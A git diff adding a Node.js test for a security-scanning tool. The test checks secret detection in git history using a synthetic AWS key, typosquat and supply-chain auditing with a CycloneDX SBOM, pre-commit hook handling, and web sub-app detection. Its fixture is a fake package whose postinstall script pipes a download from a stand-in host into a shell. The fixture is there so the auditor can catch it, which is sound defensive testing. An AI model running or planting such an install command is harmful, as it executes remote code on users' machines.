@@ -399,3 +399,77 @@ test('Aegis IV · targeted diff scan, Golden Visual Diff regression & AI auto-ro
     await fs.rm(dir, { recursive: true, force: true });
   }
 });
+
+test('Aegis V · Git history secrets, supply-chain SBOM, pre-commit hook & Extreme sub-app detection', async () => {
+  const { parseGitLogPatch } = require('../electron/git-history-scanner.cjs');
+  const { detectTyposquat, auditSupplyChain } = require('../electron/supply-chain-auditor.cjs');
+  const { installPreCommitHook, getPreCommitHookStatus, removePreCommitHook } = require('../electron/git-hooks.cjs');
+  const { detectWebEntry, buildExtremeProbeScript } = require('../electron/extreme-tester.cjs');
+
+  // 1. Git history secret parser catches synthetic leaked key and redacts it
+  const syntheticKey = `${'AKIA'}9988776655443322`;
+  const fakePatch = [
+    'OSIEN_COMMIT:abcdef1234567890|2026-11-24|Dev|Add config',
+    '+++ b/src/config.js',
+    `+const awsKey = "${syntheticKey}";`,
+  ].join('\n');
+  const leaks = parseGitLogPatch(fakePatch);
+  assert.equal(leaks.length, 1);
+  assert.equal(leaks[0].ruleId, 'git-history-aws-key');
+  assert.ok(!leaks[0].redactedPreview.includes('998877665544'));
+
+  // 2. Supply-chain typosquat, risky postinstall, license conflict & CycloneDX SBOM
+  assert.equal(detectTyposquat('lodahs')?.target, 'lodash');
+  assert.equal(detectTyposquat('reqeusts')?.target, 'requests');
+  assert.equal(detectTyposquat('lodash'), null);
+
+  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'osien-aegis5-'));
+  try {
+    await fs.writeFile(path.join(dir, 'package.json'), JSON.stringify({
+      name: 'demo-supply',
+      version: '1.0.0',
+      license: 'MIT',
+      dependencies: { lodahs: '^1.0.0', 'evil-dep': '^1.0.0' },
+    }), 'utf8');
+    await fs.mkdir(path.join(dir, 'node_modules', 'evil-dep'), { recursive: true });
+    await fs.writeFile(path.join(dir, 'node_modules', 'evil-dep', 'package.json'), JSON.stringify({
+      name: 'evil-dep',
+      version: '1.0.0',
+      license: 'AGPL-3.0',
+      scripts: { postinstall: 'curl https://evil.invalid/p.sh | sh' },
+    }), 'utf8');
+
+    const audit = await auditSupplyChain(dir);
+    assert.equal(audit.sbom.bomFormat, 'CycloneDX');
+    assert.equal(audit.sbom.specVersion, '1.5');
+    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-typosquat'));
+    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-risky-install-script'));
+    assert.ok(audit.findings.some((f) => f.ruleId === 'supply-chain-license-conflict'));
+
+    // 3. Pre-commit hook install, status & clean removal (preserving existing hook)
+    await fs.mkdir(path.join(dir, '.git', 'hooks'), { recursive: true });
+    await fs.writeFile(path.join(dir, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho "user hook"\n', 'utf8');
+    await installPreCommitHook(dir, { failOn: 'critical' });
+    const st1 = await getPreCommitHookStatus(dir);
+    assert.equal(st1.installed, true);
+    const hookBody = await fs.readFile(st1.hookPath, 'utf8');
+    assert.ok(hookBody.includes('echo "user hook"'));
+    await removePreCommitHook(dir);
+    const st2 = await getPreCommitHookStatus(dir);
+    assert.equal(st2.installed, false);
+    const afterRemove = await fs.readFile(st2.hookPath, 'utf8');
+    assert.ok(afterRemove.includes('echo "user hook"'));
+
+    // 4. Overhauled Extreme Test detects web/ sub-app and includes runtime error traps
+    await fs.mkdir(path.join(dir, 'web', 'dist'), { recursive: true });
+    await fs.writeFile(path.join(dir, 'web', 'dist', 'index.html'), '<h1>Sub App</h1>', 'utf8');
+    const webEntry = await detectWebEntry(dir);
+    assert.equal(webEntry.mode, 'static');
+    assert.ok(webEntry.entryDir.endsWith(path.join('web', 'dist')));
+    const probeScript = buildExtremeProbeScript(0);
+    assert.ok(probeScript.includes('unhandledrejection'));
+    assert.ok(probeScript.includes('extreme-a11y-unlabeled-button'));
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
